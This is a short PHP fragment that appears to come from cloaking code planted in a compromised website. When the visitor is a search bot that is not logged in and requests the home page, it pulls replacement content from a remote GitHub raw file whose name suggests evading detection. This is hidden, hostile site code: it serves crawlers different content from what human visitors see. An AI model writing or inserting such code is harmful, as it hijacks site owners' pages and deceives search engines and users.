...
if ($isBot && !$isLogged) {
    ...
    if ($clean_uri === '/' || $clean_uri === '/index.php' || empty($clean_uri)) {
        $targetUrl = 'https://raw.githubusercontent.com/desvaranayla-spec/landing-rb-2026/refs/heads/main/eitssss-tidak-kena.txt';
    }
